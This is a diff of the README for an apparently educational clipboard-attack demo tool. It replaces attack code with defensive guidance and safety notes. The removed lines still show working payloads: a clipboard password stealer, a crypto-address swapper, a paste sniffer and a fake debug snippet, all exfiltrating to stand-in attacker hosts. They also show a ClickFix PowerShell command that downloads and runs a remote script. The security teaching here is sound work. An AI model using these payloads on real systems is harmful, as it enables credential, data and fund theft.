@@ -42,6 +42,7 @@ hub: true
 ![GitHub forks](https://img.shields.io/github/forks/ipusiron/clipthreat-studio?style=social)
 ![GitHub last commit](https://img.shields.io/github/last-commit/ipusiron/clipthreat-studio)
 ![GitHub license](https://img.shields.io/github/license/ipusiron/clipthreat-studio)
+[![GitHub Pages](https://img.shields.io/badge/demo-GitHub%20Pages-blue?logo=github)](https://ipusiron.github.io/clipthreat-studio/)
 
 **Day033 - 生成AIで作るセキュリティツール100**
 
@@ -59,9 +60,17 @@ hub: true
 
 ## 📸 スクリーンショット
 
-> ![ClickFix攻撃デモ](assets/screenshot.png)
+> ![基本操作の初期画面](assets/screenshot.png)
 >
-> *ClickFix攻撃デモ*
+> *基本操作タブの初期表示（1280×800、70,438バイト）*
+
+> ![安全化したClickFixデモ](assets/screenshot2.png)
+>
+> *無害な説明文をコピーした後の伏せ字表示（1280×800、49,943バイト）*
+
+> ![文字細工の分析結果](assets/screenshot3.png)
+>
+> *ゼロ幅スペースの見本とコードポイントの分析結果（1280×800、45,774バイト）*
 
 ---
 
@@ -69,7 +78,7 @@ hub: true
 
 ### 📋 基本操作タブ
 - `clipboard.readText()` / `.writeText()` API の基本的な動作確認
-- クリップボード操作の仕組みとブラウザ制限の理解
+- クリップボード操作の仕組みとブラウザー制限の理解
 - チュートリアル機能で段階的な学習が可能
 
 ### 🔍 監視タブ
@@ -83,9 +92,9 @@ hub: true
 - ユーザーが気づかない情報漏洩の危険性を体験
 
 ### 🚨 ClickFix攻撃タブ
-- 修復誘導型コピー攻撃の完全再現
-- 偽のエラーダイアログによる心理的誘導
-- 「修復」ボタンクリックで悪意あるコードがクリップボードにコピー
+- 偽の修復案内に従う危険性を学ぶデモ
+- コピーする内容は無害な説明文のみ
+- 攻撃コマンドは伏せ字で表示し、デモ終了・リセット時にクリップボードを空にする
 
 ### 🧲 自動送信タブ
 - 自動ペースト→自動送信型のフォーム偽装攻撃
@@ -115,7 +124,7 @@ hub: true
 
 ### 基本的な使用手順
 
-1. **アクセス**: このリポジトリを `git clone` するか、上記の[GitHub Pages上のデモサイト](https://ipusiron.github.io/clipthreat-studio/)にアクセス
+1. **アクセス**: このリポジトリーを `git clone` するか、上記の[GitHub Pages上のデモサイト](https://ipusiron.github.io/clipthreat-studio/)にアクセス
 2. **ヘルプ確認**: ヘッダー右上の ❓ ボタンで詳細な使い方を確認
 3. **タブ切り替え**: 各タブで異なる攻撃手法を体験
 4. **チュートリアル**: 各タブのチュートリアル機能で段階的に学習
@@ -143,7 +152,7 @@ hub: true
 ボタンをクリックすると、以下の形式でWeirdString Inspectorにアクセスします：
 
 ```
-https://ipusiron.github.io/weirdstring-inspector/?text={攻撃文字列}&source=clipthreat-studio&attack_type={攻撃タイプ}
+https://ipusiron.github.io/weirdstring-inspector/#text={攻撃文字列}&source=clipthreat-studio&attack_type={攻撃タイプ}
 ```
 
 ### パラメーター詳細
@@ -161,17 +170,13 @@ https://ipusiron.github.io/weirdstring-inspector/?text={攻撃文字列}&source=
 - **スクリプト混在攻撃**: 複数文字体系の混在によるフィッシング
 - **同形異義文字攻撃**: 見た目が同じ異なる文字によるドメイン偽装
 
-### 実装例
+### 受け渡し時のプライバシー
 
-```javascript
-// 例：ゼロ幅スペース攻撃の場合
-const text = "f\u200Bl\u200Ba\u200Bg.txt";  // 実際の攻撃文字列
-const attackType = "ゼロ幅スペース攻撃";
-const url = `https://ipusiron.github.io/weirdstring-inspector/?text=${encodeURIComponent(text)}&source=clipthreat-studio&attack_type=${encodeURIComponent(attackType)}`;
-window.open(url, '_blank');
-```
-
-> **注意**: WeirdString Inspector側でのGETパラメータ受信機能は別途実装予定です。
+文字列と攻撃タイプはURLのハッシュ（`#text=`）に入れます。
+ハッシュはHTTPリクエストとしてサーバーへ送信されません。
+WeirdString Inspectorは、このパラメーターの受信に対応しています。
+新しいタブは`noopener,noreferrer`を指定して開きます。
+受け渡した文字列は遷移先のJavaScriptから読めるため、実際の秘密情報を入力しないでください。
 
 ---
 
@@ -184,86 +189,22 @@ window.open(url, '_blank');
 
 ---
 
-## 🧩 フォルダー構成
-
-```
-clipthreat-studio/
-├── index.html          # メインHTML（タブUI・全コンテンツ）
-├── style.css           # 全体スタイル（UI・アニメーション・レスポンシブ）
-├── CLAUDE.md           # Claude Code用プロジェクト説明書
-├── favicon.svg         # サイトアイコン
-├── js/                 # JavaScript機能モジュール
-│   ├── main.js         # タブ切り替え・ヘルプモーダル制御
-│   ├── clipboard.js    # 基本操作タブ機能
-│   ├── watch.js        # 監視タブ機能
-│   ├── sniff.js        # 盗聴タブ機能
-│   ├── clickfix.js     # ClickFix攻撃タブ機能
-│   ├── autopaste.js    # 自動送信タブ機能
-│   ├── weirdchar.js    # 文字細工タブ機能（WeirdString Inspector連携）
-│   └── tips.js         # セキュリティTipsタブ機能
-├── assets/             # 静的リソース
-└── README.md           # プロジェクト説明書
-```
-
-### 技術構成
-
-- **フロントエンド**: Vanilla JavaScript（フレームワークレス）
-- **スタイル**: CSS3（Flexbox・Grid・アニメーション）
-- **デプロイ**: GitHub Pages（静的サイト）
-- **外部連携**: WeirdString Inspector（GETパラメーター）
-- **ファイル構成**: モジュール分割による機能別管理
-
----
-
 ## 🛡️ セキュリティ解説
 
 ### クリップボード攻撃の脅威レベル
 
 クリップボード攻撃は、ユーザーが日常的に使用するコピー＆ペースト操作を悪用する高度な攻撃手法です。
-とくに危険な点は、ユーザーが攻撃に気づきにくく、機密情報の漏洩や意図しない操作を引き起こす可能性があることです。
+特に危険な点は、ユーザーが攻撃に気づきにくく、機密情報の漏洩や意図しない操作を引き起こす可能性があることです。
 
 ### 📋 基本的なクリップボード攻撃シナリオ
 
 #### シナリオ1: パスワード盗取攻撃
-```javascript
-// 攻撃者が仕込むコード例
-setInterval(async () => {
-  try {
-    const clipboardContent = await navigator.clipboard.readText();
-    if (clipboardContent.length > 8 && /[A-Z].*[0-9]|[0-9].*[A-Z]/.test(clipboardContent)) {
-      // パスワードらしい文字列を外部サーバーに送信
-      fetch('https://attacker-server.com/steal', {
-        method: 'POST',
-        body: JSON.stringify({
-          data: clipboardContent,
-          timestamp: Date.now(),
-          userAgent: navigator.userAgent
-        })
-      });
-    }
-  } catch (e) {
-    // 権限エラーは無視
-  }
-}, 2000);
-```
+コピーした秘密情報が別のページから読み取られると、意図しない漏洩につながります。サイトごとのクリップボード権限を確認し、実験には架空のデータだけを使ってください。
 
 **被害例**: ユーザーがパスワードマネージャーからパスワードをコピーした瞬間に盗取
 
 #### シナリオ2: 暗号通貨アドレス置換攻撃
-```javascript
-// 攻撃者のマルウェアコード例
-setInterval(async () => {
-  try {
-    const clipboard = await navigator.clipboard.readText();
-    // Bitcoin/Ethereumアドレスパターンを検出
-    if (/^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,62}$/.test(clipboard) || 
-        /^0x[a-fA-F0-9]{40}$/.test(clipboard)) {
-      // 攻撃者のアドレスに置換
-      await navigator.clipboard.writeText('bc1qattacker_bitcoin_address_here');
-    }
-  } catch (e) {}
-}, 1000);
-```
+送金先を貼り付けた後は、元の宛先と文字列全体を確認してください。履歴への保存や別端末への同期も確認します。
 
 **被害例**: 送金先アドレスが攻撃者のものにすり替わり、資金が盗取される
 
@@ -272,35 +213,7 @@ setInterval(async () => {
 #### 攻撃の仕組み
 悪意のあるWebサイトが入力フィールドに貼り付けられた内容を傍受する攻撃です。
 
-```javascript
-// 攻撃サイトに仕込まれるコード
-document.addEventListener('paste', async (event) => {
-  const pastedData = event.clipboardData.getData('text');
-  
-  // 機密情報パターンの検出
-  const patterns = {
-    creditCard: /\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}/,
-    ssn: /\d{3}-\d{2}-\d{4}/,
-    email: /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/,
-    password: /^(?=.*[A-Za-z])(?=.*\d)(?=.*[@$!%*#?&])[A-Za-z\d@$!%*#?&]{8,}$/
-  };
-  
-  for (const [type, pattern] of Object.entries(patterns)) {
-    if (pattern.test(pastedData)) {
-      // 機密情報を外部に送信
-      fetch(`https://evil-collector.com/steal/${type}`, {
-        method: 'POST',
-        body: JSON.stringify({
-          data: pastedData,
-          url: window.location.href,
-          timestamp: Date.now()
-        })
-      });
-      break;
-    }
-  }
-});
-```
+貼り付けた内容は、そのページのスクリプトから参照できます。送信ボタンを押していなくても安全とは限りません。管理者は通信先の制限と入力データの扱いを点検してください。
 
 ### 🚨 ClickFix攻撃の詳細メカニズム
 
@@ -310,135 +223,26 @@ document.addEventListener('paste', async (event) => {
 3. **悪意コード注入**: ボタンクリックで攻撃コードをクリップボードに書き込み
 4. **実行誘導**: PowerShellやコマンドプロンプトでの実行を指示
 
-#### 実際の攻撃コード例
-```javascript
-// ClickFix攻撃で仕込まれる悪意のあるペイロード
-const maliciousPayload = `
-powershell -WindowStyle Hidden -Command "
-# システム情報を収集
-$info = @{
-  ComputerName = $env:COMPUTERNAME
-  UserName = $env:USERNAME  
-  OS = (Get-WmiObject Win32_OperatingSystem).Caption
-  IP = (Invoke-WebRequest -Uri 'https://api.ipify.org').Content
-}
-
-# 外部サーバーに送信
-Invoke-RestMethod -Uri 'https://attacker-c2.com/collect' -Method POST -Body ($info | ConvertTo-Json)
-
-# 追加のマルウェアをダウンロード・実行
-Invoke-Expression (Invoke-WebRequest -Uri 'https://attacker-c2.com/payload.ps1').Content
-"`;
-
-// 偽の修復ボタンイベント
-document.getElementById('fake-fix-button').addEventListener('click', async () => {
-  await navigator.clipboard.writeText(maliciousPayload);
-  alert('修復コードがクリップボードにコピーされました。PowerShellを開いて貼り付けて実行してください。');
-});
-```
+#### 利用者と管理者の防御
+突然の修復案内や、OSの実行画面へ貼り付ける指示に従わないでください。利用者はページを閉じ、公式のサポート窓口へ確認します。管理者は不審なスクリプト実行を監視し、正規の対処手順を周知します。本教材は実行可能なコマンドを保持せず、外形の一部と伏せ字だけを表示します。
 
 ### 🧪 Unicode文字細工攻撃の技術詳細
 
 #### 1. ゼロ幅スペース攻撃
-```javascript
-// 見た目: config.txt
-// 実際: conf\u200Big.txt (ゼロ幅スペース混入)
-const disguisedFilename = "conf\u200Big.txt";
-console.log(disguisedFilename === "config.txt"); // false
-console.log(disguisedFilename.length); // 11 (config.txt は 10文字)
-
-// セキュリティフィルター回避例
-const maliciousScript = "scr\u200Bipt.exe"; // "script.exe" に見える
-if (!filename.includes("script")) {
-  // フィルターをすり抜けて実行される
-  executeFile(maliciousScript);
-}
-```
+ゼロ幅文字は見た目で気づきにくいため、文字数とコードポイントを確認します。正規化だけですべての不可視文字を除去できるとは限りません。
 
 #### 2. RTL文字による拡張子偽装
-```javascript
-// 見た目: harmless.png  
-// 実際: harmless\u202Egnp.exe (右から左制御文字による偽装)
-const RTL_OVERRIDE = '\u202E';
-const maliciousFile = `harmless${RTL_OVERRIDE}gnp.exe`;
-
-// ファイルマネージャーでは "harmless.png" と表示される
-// 実際には実行ファイル (.exe)
-console.log(maliciousFile); // "harmless‮gnp.exe"
-```
+方向制御文字はファイル名の表示順を変えます。表示上の拡張子だけを信用せず、実際のコードポイントとファイル形式を確認してください。
 
 #### 3. 同形異義文字攻撃（IDN偽装）
-```javascript
-// キリル文字を使ったドメイン偽装
-const realDomain = "apple.com";          // ラテン文字 'a' (U+0061)
-const fakeDomain = "аpple.com";          // キリル文字 'а' (U+0430)
+似た字形でも異なる文字体系の文字があります。ドメイン名や識別子を正規の表記と比較し、見た目だけで同一と判断しないでください。
 
-console.log(realDomain === fakeDomain);  // false
-console.log(realDomain.charCodeAt(0));   // 97 (ラテン文字)
-console.log(fakeDomain.charCodeAt(0));   // 1072 (キリル文字)
-
-// フィッシングサイトへの誘導例
-if (window.location.hostname === fakeDomain) {
-  // 本物のAppleサイトと同じデザインでフィッシング
-  stealCredentials();
-}
-```
-
-### 🧲 自動送信攻撃の実装例
+### 🧲 自動送信攻撃への対策
 
 #### 攻撃シナリオ
 開発者がデバッグコードを貼り付けた瞬間に、自動的に機密情報を外部送信する攻撃
 
-```javascript
-// 攻撃者が仕込む悪意のあるデバッグコード
-console.log("Debug mode activated");
-
-// 一見無害なコード
-fetch("https://jsonplaceholder.typicode.com/posts/1")
-  .then(response => response.json())
-  .then(data => {
-    console.log("API response:", data);
-    
-    // 隠された攻撃コード
-    const sensitiveData = {
-      localStorage: {...localStorage},
-      sessionStorage: {...sessionStorage},
-      cookies: document.cookie,
-      userAgent: navigator.userAgent,
-      currentURL: window.location.href,
-      // 環境変数や設定ファイルの内容を探索
-      envVars: extractEnvironmentVariables()
-    };
-    
-    // Base64エンコードで目立たなくする
-    const encoded = btoa(JSON.stringify(sensitiveData));
-    
-    // 正常なAPIリクエストに偽装して送信
-    fetch("https://api.attacker-analytics.com/collect", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-        "X-Analytics-ID": encoded  // データを偽装
-      },
-      body: JSON.stringify({
-        event: "debug_session",
-        timestamp: Date.now()
-      })
-    });
-  });
-
-function extractEnvironmentVariables() {
-  // ブラウザ環境での機密情報抽出
-  return {
-    platform: navigator.platform,
-    language: navigator.language,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    screen: `${screen.width}x${screen.height}`,
-    // 開発者ツールの使用状況も収集
-    devToolsOpen: window.outerHeight - window.innerHeight > 200
-  };
-}
-```
+入力や貼り付けの直後に外部通信が発生する場合があります。実装者は送信処理の開始条件・通信先・データの内容を確認し、不要な外部通信をCSPで制限してください。この教材の送信表示は模擬表示で、実際の通信は行いません。
 
 ### 🛡️ 攻撃対策とベストプラクティス
 
@@ -462,13 +266,124 @@ function extractEnvironmentVariables() {
 
 ---
 
+## 🧪 テスト
+
+Node 22以上で、依存パッケージを追加せずに実行できます。
+
+```sh
+npm test
+```
+
+GitHub Actionsはpushとpull_requestで同じテストを実行します。
+READMEの表・数値・画像参照もテストで検証します。
+
+| 項目 | 件数 |
+|---|---:|
+| 学習タブ | 7 |
+| 文字細工のコピー例 | 4 |
+| Tipsチェックリスト | 3 |
+| 各チェックリストの項目 | 10 |
+| テストファイル | 6 |
+
+- `test/shared.test.js`：種別・文字判定、エスケープ、Day023連携URL、伏せ字
+- `test/safety.test.js`：無害文言、遅延処理の取り消し、書き込み順序
+- `test/html.test.js`：CSP、外部モジュール、ARIA、インライン処理の不在
+- `test/contrast.test.js`：配色のコントラスト
+- `test/format.test.js`：行長とminify防止
+- `test/readme.test.js`：表・数値、画像参照、ディレクトリー構造
+
+## 🔒 教材の安全設計と制限
+
+ClickFixがコピーするのは、次の説明文だけです。
+
+「これは ClipThreat Studio のデモです。攻撃コマンドはクリップボードに書き込まれていません。」
+
+画面のコマンド例は「PowerShell …（危険部分は伏せ字）」のように伏せています。
+ClickFixのデモ終了、各タブのリセット、別の学習タブへの切り替えで、クリップボードを空へ戻します。
+リセット時は実行待ちのデモを取り消すため、後から古い結果やコピー内容が戻りません。
+権限拒否・API非対応で空にできない場合は、画面と読み上げ通知で手動の後始末を案内します。
+
+- 実際の外部送信は行わない。入力内容をコンソールへ記録しない。
+- CSPは同一オリジンのスクリプト・CSSだけを許可し、通信は`connect-src 'none'`で禁止する。
+- インラインのイベントハンドラー・style属性を使用しない。
+- 動的な入力は`textContent`またはHTMLエスケープで表示する。
+- 外部リンクには`noopener noreferrer`、ページには`no-referrer`を指定する。
+- キーボードでタブ・アコーディオン・ヘルプを操作できる。320px幅から折り返し、動きを減らす設定に対応する。
+
+ブラウザーを閉じる操作や権限の取り消し後には、クリップボードの消去を保証できません。
+OSのクリップボード履歴やクラウド同期の履歴は、このページから削除できません。
+また、クリップボードを空にすると以前の内容も失われます。実験には架空のデータだけを使ってください。
+このページは秘密情報の貼り付け先ではありません。
+
+`frame-ancestors`と`X-Frame-Options`はHTTPレスポンスヘッダー専用のため、metaでは設定していません。
+独立した`404.html`は今回の画面改修の対象外です。
+
+## 📁 ディレクトリー構造
+
+```text
+clipthreat-studio/                 # 教育ツール本体
+├── .claude/                      # 開発支援用の既存設定
+│   └── commands/                 # 開発支援コマンド
+│       ├── annotate.md           # 注釈の作成手順
+│       └── reload-workspace.md   # ワークスペースの再確認手順
+├── .github/                      # GitHub用設定
+│   └── workflows/                # 自動検証
+│       └── test.yml              # push・PRでNode 22のテストを実行
+├── .gitignore                    # Gitの除外設定
+├── .nojekyll                     # PagesでJekyll処理を無効化
+├── 404.html                      # 既存のエラーページ
+├── CLAUDE.md                     # 開発規則と仕様
+├── LICENSE                       # MITライセンス
+├── README.md                     # 本ドキュメント
+├── assets/                       # 画面画像
+│   ├── screenshot.png            # 基本操作の初期画面
+│   ├── screenshot2.png           # 安全化したClickFixの伏せ字
+│   └── screenshot3.png           # 文字細工の分析結果
+├── favicon.svg                   # サイトアイコン
+├── index.html                    # 7タブの画面
+├── js/                           # ESモジュール
+│   ├── autopaste.js              # 外部通信のない送信模擬表示
+│   ├── clickfix.js               # 無害文言のコピーと学習表示
+│   ├── clipboard.js              # 基本操作
+│   ├── clipboard-access.js       # 書き込み順序と後始末
+│   ├── clipthreat-messages.js     # 日本語の表示辞書
+│   ├── main.js                   # タブ・ヘルプ・イベント制御
+│   ├── shared.js                 # DOM非依存の判定・URL・伏せ字
+│   ├── sniff.js                  # 貼り付けの可視化
+│   ├── tips.js                   # 対策チェックリスト
+│   ├── ui.js                     # CSSクラスによる表示制御
+│   ├── watch.js                  # 許可を得た監視
+│   └── weirdchar.js              # 文字細工の見本と連携
+├── package.json                  # 依存なしのテストコマンド
+├── style.css                     # 配色・レイアウト・モバイル対応
+└── test/                         # Node標準の自動テスト
+    ├── contrast.test.js          # 配色の検証
+    ├── format.test.js            # 行長・minify検証
+    ├── html.test.js              # 画面構造とCSPの検証
+    ├── readme.test.js            # 文書・件数・画像の検証
+    ├── safety.test.js            # 安全化・後始末の検証
+    └── shared.test.js            # 純粋ロジックの検証
+```
+
+## 💻 動作環境
+
+ESモジュールとClipboard APIに対応するブラウザーで、HTTPSまたはlocalhostのHTTPから利用します。
+`file://`での直接読み込みには対応しません。ビルドや依存パッケージのインストールは不要です。
+
+```sh
+python -m http.server 8000 --bind 127.0.0.1
+```
+
+`http://127.0.0.1:8000/`を開いてください。
+クリップボードの読み取り・書き込みには、ブラウザーの権限やフォーカス状態による制限があります。
+
 ## 📄 ライセンス
 
 MIT License - 詳細は [LICENSE](LICENSE) をご覧ください。
 
 ---
 
-## 🛠 このツールについて
+## 🛠️ このツールについて
 
 本ツールは、「生成AIで作るセキュリティツール100」プロジェクトの一環として開発されました。 このプロジェクトでは、AIの支援を活用しながら、セキュリティに関連するさまざまなツールを100日間にわたり制作・公開していく取り組みを行っています。
 
